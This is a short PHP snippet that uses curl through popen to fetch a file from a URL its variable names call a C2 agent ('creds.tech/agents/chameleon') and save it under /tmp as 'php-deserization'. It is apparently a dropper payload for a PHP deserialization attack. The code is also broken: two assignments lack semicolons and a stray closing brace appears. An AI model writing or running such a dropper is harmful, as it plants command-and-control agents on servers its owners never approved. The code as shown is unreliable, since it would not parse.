<?php
        $c2AgentUrl = "https://creds.tech/agents/chameleon"
        $agentName = "php-deserization"
        
        $command = sprintf("curl -o /tmp/%s %s", escapeshellarg($agentName), escapeshellarg($c2AgentUrl));
        $handle = popen($command, 'w');

        if ($handle !== false) {
            pclose($handle);
            echo "Download initiated successfully.";
        } else {
            echo "Failed to initiate download.";
        }
    }
?>
